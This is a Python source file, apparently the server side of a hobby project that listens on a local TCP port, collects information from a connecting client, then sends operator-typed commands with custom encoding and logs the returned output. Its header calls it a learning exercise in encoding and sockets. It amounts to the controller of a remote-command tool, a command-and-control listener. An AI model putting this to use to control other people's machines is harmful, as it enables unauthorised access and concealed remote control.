#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
    File name: server.py
    Author: MathIsSimple
    Python Version: 3.7.0
    Disclaimer: I created this project to learn about custom encoding and python sockets,
                this projected isn't made to be used for maliscious intent. Do so at your own risk
'''

# Import needed core python modules

import socket
import time
from sys import argv
from sys import path

path.insert(0, './../lib/')

# Import needed custom python modules

from hasing import modify
from fileManager import getFilesInDir
from fileManager import createWritableFile

# Global Variables

PORT = 64500

# All of the functions needed for this project to work

def createConnexion(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen()
    conn, addr = sock.accept()

    return (sock, conn, addr)

def getTime():

    return int(round(time.time() * 1000))

def send(data):
    conn.sendall(modify(str(data)).encode())

def receiveData():
    rcv = modify(conn.recv(1024).decode("utf-8", "ignore"))

    if rcv != "END":
        f.write(modify(rcv))
        f.write("\n")

    return rcv

def createLog():
    logs = getFilesInDir("./../logs/")
    biggest_number = 0
    hadANumber     = False

    for log in logs:
        log_number = int(log[4:-4])
        if hadANumber == True:
            if log_number > biggest_number:
                biggest_number = log_number
        else:
            biggest_number = log_number
            hadANumber = True

    log_number = biggest_number + 1

    file_name = "log_"+str(log_number)+".txt"
    f = createWritableFile("../logs/"+file_name)

    return f

# Ask for the port if it hasn't been given as a command line argument

if len(argv) > 1:
    PORT = int(argv[1])
else:
    PORT = int(input("On which port do you want the server to be created on ? : "))

sock, conn, addr = createConnexion("127.0.0.1", PORT)
print("Connexion")

f = createLog()
print("Created Log")

receivingInfo   = True
sendingCommands = False
print("Waiting for Info")

while True:
    if receivingInfo:
        received = receiveData()
        if received != "END":
            print("Info : " + received)
        else:
            receivingInfo   = False
            sendingCommands = True
        
    if sendingCommands:
        command = input("Command To Execute ")
        if command != "END":
            f.write(modify(command))
            f.write("\n")
            send(command)
            last_rcv_time = getTime()

            while True:
                current_time = getTime()
                if (current_time - last_rcv_time >= 2000):
                    break
                    
                received = receiveData()
                if received != "":
                    last_rcv_time = getTime()
                    if received != "END":
                        print(received)
                    else:
                        break
        else:
            send("END")
            f.close()
            sock.close()
            exit(0)